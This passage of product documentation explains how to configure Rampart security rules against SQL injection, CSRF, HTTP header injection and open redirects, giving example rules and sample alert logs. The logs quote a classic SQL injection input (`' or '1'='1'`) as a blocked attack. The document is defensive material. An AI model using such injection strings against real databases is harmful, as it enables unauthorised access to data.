• `quoted-identifiers` - `mssql` and `sybase`: corresponds to the QUOTED_IDENTIFIER flag |

## When (Event)

| injection | This condition allows the user to specify the type of injection:
• `successful-attempt` the rule triggers upon detecting a valid SQLi payload that would have resulted in a successful SQLi attack, exploiting the underlying database.
• `failed-attempt` the rule triggers upon detecting an invalid SQLi payload that would have resulted in an unsuccessful SQLi attack, which could expose the underlying database configuration or vendor.
If no value is specified then a default value of `successful-attempt` is used.
In addition, the user may optionally specify the following parameter:
• `permit: query-provided` the rule does not trigger in the case where the entire SQL query (and not just part of it) has come from any of the untrusted sources defined in the input declaration.
An exception is thrown if an unsupported value is provided. |

ℹ️ Multiple `sql` rules are allowed in the same Rampart mod providing they have different injection types.

## Then (Action)

The action statement specifies the action the agent takes whenever an attack is detected. There are two supported actions, `protect`and `detect`:

| Action | Description |
| ------ | ----------- |
| protect | A valid SQL injection attack is not allowed to be processed by the database. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. SQLi attacks are allowed by the agent. If configured, a log message is generated with details of the event. A log message must be specified with this action. |

In the case of `protect`, if no additional configuration is given, the rule takes a default action depending on which of the injection types has occurred. A specific action can be configured for this rule to send an HTTP response with a specified status code and a message as body. These configurations are further described in the table below.

ℹ️ Only the HTTP 400 (Bad Request) status code is currently supported in the `protect` action declaration.

| action | setting | successful-attempt | failed-attempt |
| ------ | ------- | ------------------ | -------------- |
| protect | default | A SQLException is thrown by the agent to indicate that the SQL statement is invalid, letting the server handle the exception gracefully. | The HTTP connection, from which the malicious data that exploited the SQL statement originated, is disconnected. |
| protect | send HTTP error | The server responds back to the web client with a brand new HTTP response that has been configured with a status code (HTTP 400 Bad Request). | The server responds back to the web client with a brand new HTTP response that has been configured with a status code (HTTP 400 Bad Request). |
| detect | --- | The SQL injection attack is allowed to be processed by the database. | The invalid SQL statement is allowed to be processed by the database. |

As part of the action statement, the user may optionally specify the parameter `stacktrace: “full”`. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

ℹ️ Payload whitelisting can be applied using the command-line option `Rampart.AllowSQLiPayloads`. The value supplied should be a comma-separated list of strings to substring-match against SQLi payloads to be whitelisted and therefore not register as an SQL injection attack. Example: `Rampart.AllowSQLiPayloads=AND,OR`

## Example

The following `sql` rule is used to protect a MySQL database from SQL injection attacks.

The `input` and `injection` conditions are satisfied when the untrusted data originates from an HTTP/HTTPS request, and the resulting SQL statement is either a valid query that would exploit the database or an invalid query that may disclose information about the database configuration or vendor.

An action of `protect` is defined to ensure that the agent does not allow any malicious SQL statement to be processed by the database. A log message and severity are both specified, and these are included in any generated log entries if an attack is detected.

```
app("SQL mod"):
  requires(version: Rampart/2.10)
  sql("Protect MySql database from SQL Injection attacks"):
    vendor(mysql)
    input(http)
    injection(successful-attempt, failed-attempt)
    protect(message: "SQL injection attack detected and blocked", severity: High)
  endsql
endapp
```

### Logging

When the `sql` rule is triggered a log entry similar to the following is generated:

```
<10>1 2021-03-30T17:33:55.538+01:00 userX_system java 32008 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect MySql database from SQL Injection attacks|Execute Rule|High|rt=Mar 30 2021 17:33:55.537 +0100 dvchost=userX_system procid=32008 appVersion=1 ruleType=sql securityFeature=sql injection act=protect msg=SQL injection attack detected and blocked databaseVendor=mysql httpSessionId=3153E581A645E2A54D3C12D3928473BC sql=SELECT * FROM users_table WHERE str_name\='' or '1'\='1'; taintSource=HTTP_SERVLET httpRequestUri=/spiracle/Get_int httpRequestMethod=GET internalHttpRequestUri=/spiracle/Get_int httpCookies=JSESSIONID\=3153E581A645E2A54D3C12D3928473BC remoteIpAddress=0:0:0:0:0:0:0:1
```

## Further Examples

The following mod is the same as the previous example, with the stacktrace also logged:

```
app("SQL mod - with stacktrace"):
  requires(version: Rampart/2.10)
  sql("Protect MySql database from SQL Injection attacks"):
    vendor(mysql)
    input(http)
    injection(successful-attempt, failed-attempt)
    protect(message: "SQL injection attack detected and blocked", severity: High, stacktrace: "full")
  endsql
endapp
```

### Logging

When the above Rampart `sql` rule is triggered a log entry similar to the following is generated:

```
<10>1 2021-04-01T11:30:25.075+01:00 userX_system java 25024 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect MySql database from SQL Injection attacks|Execute Rule|High|rt=Apr 01 2021 11:30:25.073 +0100 dvchost=userX_system procid=25024 appVersion=1 ruleType=sql securityFeature=sql injection act=protect msg=SQL injection attack detected and blocked stacktrace=com.example.spiracle.sql.util.SelectUtil.executeQuery(SelectUtil.java:67)\ncom.example.spiracle.sql.servlet.oracle.Get_int.executeRequest(Get_int.java:77)\ncom.example.spiracle.sql.servlet.oracle.Get_int.doGet(Get_int.java:52)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:624)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:956)\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:442)\norg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1082)\norg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:623)\norg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\njava.lang.Thread.run(Thread.java:748) databaseVendor=mysql httpSessionId=Unknown sql=SELECT * FROM users_table WHERE str_name\='' or '1'\='1'; taintSource=HTTP_SERVLET httpRequestUri=/spiracle/Get_int httpRequestMethod=GET internalHttpRequestUri=/spiracle/Get_int httpCookies= remoteIpAddress=0:0:0:0:0:0:0:1
```

The following mod enables the agent to automatically detect the database type in use by the application. The mod protects against valid SQL injection attacks that originate from an HTTP/HTTPS request:

```
app("SQL mod 2"):
  requires(version: Rampart/2.10)
  sql("Protect database from successful SQL Injection attacks"):
    vendor(any)
    input(http)
    injection(successful-attempt)
    protect(message: "SQL injection attack detected and blocked", severity: Very-High)
  endsql
endapp
```

The following mod monitors a MSSQL database, detecting valid SQL injection attacks that originate from a JDBC connection:

```
app("SQL mod 3"):
  requires(version: Rampart/2.10)
  sql("Protect MSSQL database from successful stored SQL Injection attacks"):
    vendor(mssql)
    input(database)
    injection(successful-attempt)
    detect(message: "SQL injection attack detected", severity: 5)
  endsql
endapp
```

The following mod protects an Oracle database against valid SQL injection attacks that originate from an HTTP /HTTPS request. If the entire SQL query has originated from an HTTP/HTTPS request then the mod lets it through to the database:

```
app("SQL mod 4"):
  requires(version: Rampart/2.10)
  sql("Protect Oracle database from successful SQL Injection attacks"):
    vendor(oracle)
    input(http)
    injection(successful-attempt, permit: query-provided)
    protect(message: "SQL injection attack detected and blocked", severity: 8)
  endsql
endapp
```

The following mod does not specify the `vendor` declaration, enabling, by default, the agent to automatically detect the database type in use by the application. The mod protects against invalid attempts at SQL injection that originate from various untrusted sources. Logging is switched off by the omission of the log message parameter:

```
app("SQL mod 5"):
  requires(version: Rampart/2.10)
  sql("Protect database from unsuccessful SQL Injection attacks from various sources"):
    input(http, database, deserialization)
    injection(failed-attempt)
    protect()
  endsql
endapp
```

The following mod automatically detects the database type in use by the application. It protects databases against valid SQL injection attacks but also malicious SQL queries that originate from an untrusted HTTP request source. The action configuration in place returns an HTTP 400 response back to the web client with a default message as the response body:

```
app("SQL mod 6"):
  requires(version: Rampart/2.10)
  sql("Protect against SQLI attacks and malicious SQL payloads coming from HTTP"):
    injection(successful-attempt, failed-attempt)
    protect(http-response: {new-response: {code: 400}},
              message: "SQL injection attack detected and blocked", severity: 10)
  endsql
endapp
```

# Rampart HTTP Rule

## **CSRF Security Feature**

## Overview

Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated. CSRF attacks specifically target state-changing requests. They are not aimed at data theft since the attacker has no way to see the response to the forged request.

ℹ️ Cross-Site Request Forgery vulnerabilities are covered by CWE-352.

Rampart provides protection against CSRF attacks via two separate techniques:

1. The Synchronizer Token Pattern (STP)

With this security feature enabled the agent injects CSRF tokens into specific HTML elements. The HTML elements covered are:

- **<form>** elements in which the token is injected as a hidden input field.
- **<a>** elements in which the token is injected in the URL specified by its **href** attribute.
- **<frame>** and **<iframe>** elements in which the token is injected in the URL specified by their **src** attributes.

⚠️ Only cases that trigger GET and POST requests are supported. For instance, **<form>** tags that trigger PUT requests are not supported. The **srcdoc** attribute present in **<iframe>** HTML elements are not protected against CSRF attacks.

The Synchronizer Token Pattern uses HTTP sessions to store the trusted CSRF token. Any web application that does not use the `javax.servlet.http.HttpSession` interface for session management is not supported and is thus not protected from CSRF attacks.

Additionally, unauthenticated HTTP requests that do not contain a valid HTTP session ID are not validated.

⚠️ HTTP requests built dynamically using JavaScript or submitted using AJAX techniques are not supported and the CSRF protection does not serve them. This may disrupt the usual workflow of the application. Users can avoid this by using the whitelist functionality of this rule, as described below. Additionally, `ajax: no-validate` option can be used to disable validation of such requests. See below for more details.

2. **Verifying the Same Origin with Standard Headers**

With this security feature enabled the agent checks if the source origin of the received HTTP request is different from the target origin. The source origin is determined by the `Origin`, `Referer`, or `X-Forwarded-For` headers. The target origin is determined by the `Host` or `X-Forwarded-Host` headers or by the hosts configured in the HTTP Rampart rule.

⚠️ Only cases that trigger POST requests are supported. For example, same-origin validation is not triggered for GET or PUT HTTP requests.
​​
If none of the origin headers are present, the origin validation cannot be performed and the rule blocks the HTTP request.

ℹ️ Users can enable each of these two protection types individually, or both simultaneously as recommended by OWASP.

## Given (Condition)

The CSRF security feature is enabled using the Rampart `http` rule. With this rule the user specifies the condition `request`.

| request | This declaration determines the HTTP endpoints for which protection is enabled. |
| request | synchronized-tokens | This declaration is specified with no parameters. Protection is enabled for all HTTP endpoints. |
| request | same-origin | An optional Key-Value pair can be supplied to this declaration where the key is `paths` and the value can be one of the following (indicating specifically targeted HTTP endpoints):
• a quoted string
• a list of one or more quoted-strings
• the wildcard character (*) is supported to cover multiple URIs. This can be specified as:
	◦ a prefix `*/target.jsp`
	◦ a suffix `/myApplication/*`
	◦ both a prefix and a suffix `*/target*`
• if the wildcard character is one of the characters in the path itself, it has to be escaped using the backslash character `\*`
If no value is specified then protection is applied to all HTTP endpoints by default. If a string value is specified then it must:
• not be empty
• be a valid relative URI |

## When (Event)

| csrf | This declaration switches on the CSRF security feature and must be declared with one of the following values:
• `synchronized-tokens` enabling CSRF protection via STP
• `same-origin` enabling CSRF protection via validation of origin headers |
| csrf  | synchronized-tokens | With this protection enabled, the following `options` may also be specified:
• `exclude`
	◦ disable protection for any specific URIs
	◦ if this option is not specified the default value is an empty exclusion list, therefore enabling protection for all web-pages
	◦ specific URIs can be specified as a single string literal, or a non-empty array of one or more string literals
	◦ the wildcard character (*) is supported to cover multiple URIs. This can be specified as:
		▪ a prefix `*/safe.jsp`
		▪ a suffix `/myApplication/*`
		▪ both a prefix and a suffix `*/safe*`
• `method`
	◦ specify the particular HTTP method(s) with which to enable protection (currently supported values are `GET` and `POST`)
	◦ if this option is not specified - the default value is `POST`
• `token-type`
	◦ specify if a different token should be generated for each HTTP method type, or if a shared value is to be used for all HTTP method types (supported values are `shared` or `unique`)
	◦ if this option is not specified the default value is `shared`
• `token-name`
	◦ specify the name of the token to be injected into the HTML
	◦ token names must be between 5 - 20 characters long, and each character of the token name must be URL safe
	◦ if this option is not specified the default value is `_X-CSRF-TOKEN`
• `ajax`
	◦ specify whether the agent should validate AJAX requests (supported values are `validate` or `no-validate`)
	◦ if this option is not specified the default value is `validate` |
| csrf | same-origin | With this protection enabled, the following options may also be specified:
• `exclude`
	◦ disable protection for any specific URIs
	◦ if this option is not specified the default value is an empty exclusion list, therefore enabling protection for all web-pages
	◦ specific URIs can be specified as a single string literal, or a non-empty array of one or more string literals
	◦ the wildcard character (*) is supported to cover multiple URIs. This can be specified as:
		▪ a prefix `*/safe.jsp`
		▪ a suffix `/myApplication/*`
		▪ both a prefix and a suffix `*/safe*`
• `hosts`
	◦ should the source origin not match the target origin, even for a non-malicious request, this option can be used to whitelist known safe origins
	◦ can specify a single string literal, or a non-empty array of one or more string literals
	◦ each string should comprise a host name and optional port number, separated by a colon.
This option can be used to whitelist both high-level domains, or specific hostnames. For example, specifying `mydomain.com`  allows requests from various hosts within this domain, such as `server1.mydomain.com`  and `server2.mydomain.com`. |

## Then (Action)

| action | feature | description |
| ------ | ------- | ----------- |
| protect | synchronized-tokens | CSRF attacks are blocked by the agent. The malicious HTTP request is terminated and an HTTP 403 response is returned to the client. If configured, a log message is generated with details of the event. |
| protect | same-origin | If a CSRF attack is identified then the malicious HTTP request is not terminated, but all of its HTTP parameters and cookies are considered malicious and are stripped from the request, rendering it safe. |
| detect | --- | Monitoring mode: the application behaves as normal. Malicious HTTP requests that are the result of a CSRF attack are allowed to be processed by the application. If configured, a log message is generated with details of the event. A log message must be specified with this action. |

As part of the action statement, the user may optionally specify the parameter `stacktrace: “full”`. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

## Examples

The following example shows how the user may configure the CSRF STP security feature to enable protection for all HTTP endpoints, using the default value for all optional parameters to the `csrf` declaration:

```
app("CSRF STP Mod"):
  requires(version: Rampart/2.10)
  http("CSRF STP"):
    request()
    csrf(synchronized-tokens)
    protect(message: "CSRF STP validation failed", severity: 9)
  endhttp
endapp
```

Similarly, the following example shows how the user may configure the CSRF Same Origins security feature to enable protection for HTTP endpoints. In this example, the user has not specified any known safe origins:

```
app("CSRF Same Origin Mod"):
  requires(version: Rampart/2.10)
  http("CSRF Same Origin"):
    request()
    csrf(same-origin)
    protect(message: "CSRF Same Origin validation failed", severity: High)
  endhttp
endapp
```

### Logging

A log entry similar to the following is generated when each of the above `http` rules identify a CSRF attack, respectively:

```
<9>1 2021-03-29T11:53:05.341+01:00 userX_system java 15891 - - CEF:0|Rampart:Rampart|Rampart|2.10|CSRF STP|Execute Rule|Very-High|rt=Mar 29 2021 11:53:05.341 +0100 dvchost=userX_system procid=15891 appVersion=1 ruleType=http securityFeature=http csrf stp act=protect msg=CSRF STP validation failed httpRequestUri=/spiracle/CSRFServlet httpRequestMethod=GET internalHttpRequestUri=/spiracle/CSRFServlet httpSessionId=E654F722AAFA3BF44F0D0BD4FB91134C httpCookies=JSESSIONID\=E654F722AAFA3BF44F0D0BD4FB91134C remoteIpAddress=0:0:0:0:0:0:0:1
```

```
<10>1 2021-03-29T10:03:16.832+01:00 userX_system java 2402 - - CEF:0|Rampart:Rampart|Rampart|2.10|CSRF Same Origin|Execute Rule|High|rt=Mar 29 2021 10:03:16.832 +0100 dvchost=userX_system procid=2402 appVersion=1 ruleType=http securityFeature=http csrf same origin act=protect msg=CSRF Same Origin validation failed reason=Missing source origin httpRequestUri=/spiracle/CSRFServlet httpRequestMethod=GET internalHttpRequestUri=/spiracle/CSRFServlet remoteIpAddress=127.0.0.1 httpSessionId=8944B619DD9B0ADBF37CA663F8337AFD httpCookies=JSESSIONID\=8944B619DD9B0ADBF37CA663F8337AFD
```

## Further Examples

The following mods are the same as the previous examples, with the stacktrace also logged:

```
app("CSRF STP Mod - with stacktrace"):
  requires(version: Rampart/2.10)
  http("CSRF STP"):
    request()
    csrf(synchronized-tokens)
    protect(message: "CSRF STP validation failed", severity: 9, stacktrace: "full")
  endhttp
endapp
```

```
app("CSRF Same Origin Mod - with stacktrace"):
  requires(version: Rampart/2.10)
  http("CSRF Same Origin"):
    request()
    csrf(same-origin)
    protect(message: "CSRF Same Origin validation failed", severity: High, stacktrace: "full")
  endhttp
endapp
```

### Logging

A log entry similar to the following is generated when each of the above `http` rules identify a CSRF attack, respectively:

```
<9>1 2021-03-29T10:10:18.286+01:00 userX_system java 8189 - - CEF:0|Rampart:Rampart|Rampart|2.10|CSRF STP|Execute Rule|Very-High|rt=Mar 29 2021 10:10:18.286 +0100 dvchost=userX_system procid=8189 appVersion=1 ruleType=http securityFeature=http csrf stp act=protect msg=CSRF STP validation failed stacktrace=org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:956)\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:442)\norg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1082)\norg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:623)\norg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:318)\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\njava.lang.Thread.run(Thread.java:748) httpRequestUri=/spiracle/CSRFServlet httpRequestMethod=GET internalHttpRequestUri=/spiracle/CSRFServlet httpSessionId=5D7CE07F605C3A6ABCFDB35D065A95E5 httpCookies=JSESSIONID\=5D7CE07F605C3A6ABCFDB35D065A95E5 remoteIpAddress=0:0:0:0:0:0:0:1
```

```
<10>1 2021-03-30T10:05:09.120+01:00 userX_system java 2402 - - CEF:0|Rampart:Rampart|Rampart|2.10|CSRF Same Origin|Execute Rule|High|rt=Mar 30 2021 10:05:09.119 +0100 dvchost=userX_system procid=2402 appVersion=1 ruleType=http securityFeature=http csrf same origin act=protect msg=CSRF Same Origin validation failed stacktrace=org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:956)\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:442)\norg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1082)\norg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:623)\norg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\njava.lang.Thread.run(Thread.java:748) reason=Missing source origin httpRequestUri=/spiracle/CSRFServlet httpRequestMethod=GET internalHttpRequestUri=/spiracle/CSRFServlet remoteIpAddress=127.0.0.1 httpSessionId=8944B619DD9B0ADBF37CA663F8337AFD httpCookies=JSESSIONID\=8944B619DD9B0ADBF37CA663F8337AFD
```

The following mod configures CSRF STP protection for all HTTP endpoints. Protection is enabled for both GET and POST requests, with a different token used for each request type:

```
app("CSRF STP Mod 2"):
  requires(version: Rampart/2.10)
  http("CSRF STP"):
    request()
    csrf(synchronized-tokens, options:
                              {method: [POST, GET],
                              token-type: unique})
    protect(message: "CSRF STP validation failed", severity: 10)
  endhttp
endapp
```

The following mod detects CSRF attacks that fail CSRF STP validation. Validation is applied to all HTTP endpoints, except for `/myApplication/safe.jsp`. This applies to GET requests only:

```
app("CSRF STP Mod 3"):
  requires(version: Rampart/2.10)
  http("CSRF STP"):
    request()
    csrf(synchronized-tokens, options:
                              {exclude: ["/myApplication/safe.jsp"],
                              method: [GET]})
    detect(message: "CSRF STP validation failed", severity: 5)
  endhttp
endapp
```

The following mod detects CSRF attacks that fail CSRF STP validation. Validation is applied to all HTTP endpoints, except for those ending with `.jsp`. This applies to both GET and POST requests:

```
app("CSRF STP Mod 4"):
  requires(version: Rampart/2.10)
  http("CSRF STP"):
    request()
    csrf(synchronized-tokens, options:
                              {exclude: ["*.jsp"],
                              method: [GET, POST]})
    detect(message: "CSRF STP validation failed", severity: Very-High)
  endhttp
endapp
```

The following mod configures CSRF Same Origin protection for specific HTTP endpoints. The hosts `host` and `host2:8080` are whitelisted such that protection is not applied to these hosts even if the source origin and target origin do not match.

The following mod configures CSRF Same Origin protection for specific HTTP endpoints. The hosts host and host2:8080 are whitelisted such that protection is not applied to these hosts even if the source origin and target origin does not match:

```
app("CSRF Same Origin Mod 2"):
  requires(version: Rampart/2.10)
  http("CSRF Same Origin"):
    request(paths: ["/path/to/vulnerablePage.jsp",
                    "/path/to/vulnerableServlet"])
    csrf(same-origin, options:
                      {hosts: ["host1", "host2:8080"]})
    protect(message: "CSRF Same Origin validation failed", severity: Medium)
  endhttp
endapp
```

The following mod configures CSRF Same Origin protection for HTTP endpoints containing `/vulnerable`:

```
app("CSRF Same Origin Mod 3"):
  requires(version: Rampart/2.10)
  http("CSRF Same Origin"):
    request(paths: ["*/vulnerable*"])
    csrf(same-origin)
    protect(message: "CSRF Same Origin validation failed", severity: High)
  endhttp
endapp
```

The following mod configures CSRF Same Origin protection for all HTTP endpoints except for `/myApplication/safe.jsp`:

```
app("CSRF Same Origin Mod 4"):
  requires(version: Rampart/2.10)
  http("CSRF Same Origin"):
    request()
    csrf(same-origin, options:
                      {exclude: ["/myApplication/safe.jsp"]})
    protect(message: "CSRF Same Origin validation failed", severity: Medium)
  endhttp
endapp
```

The following mod configures CSRF Same Origin protection for all HTTP endpoints in `/myApplication` except for `/myApplication/safe1.jsp` and `/myApplication/safe2.jsp`:

```
app("CSRF Same Origin Mod 5"):
  requires(version: Rampart/2.10)
  http("CSRF Same Origin"):
    request(paths: ["/myApplication/*"])
    csrf(same-origin, options:
                      {exclude: ["/myApplication/safe1.jsp", "/myApplication/safe2.jsp"]})
    protect(message: "CSRF Same Origin validation failed", severity: High)
  endhttp
endapp
```

The following mod configures CSRF Same Origin protection for all HTTP endpoints, except for those ending with `.jsp`.

```
app("CSRF Same Origin Mod 6"):
  requires(version: Rampart/2.10)
  http("CSRF Same Origin"):
    request()
    csrf(same-origin, options:
                      {exclude: ["*.jsp"]})
    protect(message: "CSRF Same Origin validation failed", severity: High)
  endhttp
endapp
```

## **HTTP Header Injection Security Feature**

## **Overview**

HTTP response header injection vulnerabilities arise when user-supplied data is copied into a response header in an unsafe way. If an attacker can inject newline characters into the header, then they can inject new HTTP headers. If an attacker can inject an empty line into the header, then they can break out of the headers into the message body and write arbitrary content into the application's response.

ℹ️ HTTP header injection vulnerabilities are covered by CWE-113.

HTTP response header injection occurs when any of the targets below contains one or more user-controlled new line characters:

- response header names and values
- response cookie names and values
- response cookie domain and paths

ℹ️ The new line characters that are currently supported are CR (Carriage Return) and LF (Line Feed):
- CR is represented as "\r" in Java and has ASCII value 13 or 0x0D
- LF is represented as "\n" in Java and has ASCII value 10 or 0x0A

The HTTP Response Header Injection security feature is enabled using the Rampart `http` rule. When this security feature is enabled the agent monitors HTTP responses and ensures that the HTTP response headers and cookies do not contain user-controlled newline characters that can cause such attacks as HTTP response splitting.

## Given (Condition)

To enable the HTTP Header Injection security feature using the Rampart `http` rule the user specifies the response declaration.

| response | This determines the HTTP endpoints for which protection is enabled. An optional Key-Value pair can be supplied to this declaration where the key is `paths` and the value can be one of the following (indicating specifically targeted HTTP endpoints) :
• a quoted string
• a list of one or more quoted strings
If no value is specified then protection is applied to all HTTP endpoints by default. If a string value is specified then it must:
• not be empty
• be a valid relative URI
Only one Rampart `http` rule for HTTP Header Injection protection is allowed to be defined for a given HTTP endpoint. |

## When (Event)

The header injection rule supports one event - `injection`

| injection | This is a mandatory declaration that allows the user to specify the target type for which the Rampart `http` rule should enable HTTP response header injection protection. The following target types are supported:
• headers - protect against injection into HTTP response headers
• cookies - protect against injection into HTTP response cookies |

## Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | If an HTTP response header or cookie contains user-controlled newline characters then the offending header or cookie is removed from the HTTP response. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. HTTP response headers or cookies contain user-controlled newline characters that are allowed by the agent. If configured, a log message is generated with details of the event. A log message must be specified with this action. |


## Examples

The following Rampart `http` rule switches on the HTTP Header Injection security feature for headers for all HTTP endpoints:

```
app("HTTP Response Header Injection mod"):
  requires(version: Rampart/2.10)
  http("HTTP header injection protection for all HTTP endpoints - headers"):
    response()
    injection(headers)
    protect(message: "CRLF injection found in HTTP response headers", severity: 7)
  endhttp
endapp
```

The following mod protects against HTTP response header injection in headers for a single HTTP endpoint:

```
app("HTTP Response Header Injection mod 2"):
  requires(version: Rampart/2.10)
  http("HTTP header injection protection for specific HTTP endpoint - headers"):
    response(paths: "/webapp/index.jsp")
    injection(headers)
    protect(message: "CRLF injection found in HTTP response headers", severity: 7)
  endhttp
endapp
```

The following mod detects HTTP response header injection in headers for a multiple HTTP endpoints:

```
app("HTTP Response Header Injection mod 3"):
  requires(version: Rampart/2.10)
  http("HTTP header injection detection for multiptle HTTP endpoints - headers"):
    response(paths: ["/webapp/testPageA.jsp", "/webapp/testPageB.jsp"])
    injection(headers)
    detect(message: "CRLF injection found in HTTP response headers", severity: 7)
  endhttp
endapp
```

The following mod protects against HTTP response header injection in cookies for all HTTP endpoints:

```
app("HTTP Response Header Injection mod 4"):
  requires(version: Rampart/2.10)
  http("HTTP header injection protection for all HTTP endpoints - cookies"):
    response()
    injection(cookies)
    protect(message: "CRLF injection found in HTTP response cookies", severity: 7)
  endhttp
endapp
```

## **Open Redirect Security Feature**

## Overview

Web applications that redirect the user to another location based on user-controlled input are vulnerable to Open Redirect attacks. In such attacks, the attacker can specify a link to an external site and use that link in an HTTP redirect operation. This attack simplifies phishing attacks. Open Redirect attacks are included in the SANS Top 25 Most Dangerous Software Errors.

ℹ️ Open Redirect vulnerabilities are covered by CWE-601.

⚠️ This rule provides protection only when user input is received via an API that is enabled in the `input` declaration of the rule.

The Rampart Redirect security feature can be used to enable protection against Open Redirect attacks.

## Given (Conditions)

The user can specify two conditions in the Rampart `http` rule to enable the Rampart Redirect security feature - `input` and `response`.

| input | This allows the user to specify the source of the untrusted data. The following three sources are supported:
• `http` data introduced via HTTP/HTTPS requests
• `database` data introduced via JDBC connections
• `deserialization` data introduced via Java or XML deserialization The rule triggers if the source of the untrusted data matches that specified in the rule. If no value is specified then a default value of `http` is used. An exception is thrown if an unsupported value is provided. |
| response | This allows the user to specify that protection is required for an HTTP/HTTPS response. |

## When (Event)

| open-redirect | This condition allows the user to specify that protection against open redirect attacks is required. This can be declared empty, without any parameters, indicating that protection against open redirects is required for all external domains or IP addresses.   Alternatively, the user may specify the following options as a parameter:
• `open-redirect(options: {exclude: subdomains})`
This option is useful for applications that require open redirects to subdomains of the same root domain to be allowed. Specifying the `exclude: subdomains` option allows all HTTP server-side redirects to URLs as long as the parent subdomain or root domain is the same as the application’s domain. For example:
• if the domain of the application is `foo.com`, then it may be necessary to allow open redirects to subdomains such as:
	◦ `bar.foo.com`
	◦ `example.foo.com`
• if the domain of the application is `something.foo.com` then it may be necessary to allow open redirects to another domain that has the same parent domain, such as:
	◦ `somethingElse.foo.com`
It is also possible to specify the list of host names for which the rule applies, which is useful in cases when the application does need to allow the open-redirect to selected hosts.
